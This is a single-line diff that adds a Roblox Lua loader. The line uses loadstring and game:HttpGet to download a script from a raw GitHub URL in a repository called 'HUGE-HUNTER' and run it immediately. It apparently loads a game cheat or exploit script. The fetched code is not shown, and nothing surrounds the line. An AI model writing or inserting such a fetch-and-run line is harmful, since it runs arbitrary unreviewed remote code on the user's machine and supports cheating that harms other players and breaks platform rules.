@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/SPIDROSH/HUGE-HUNTER/refs/heads/main/acri.txt'))()
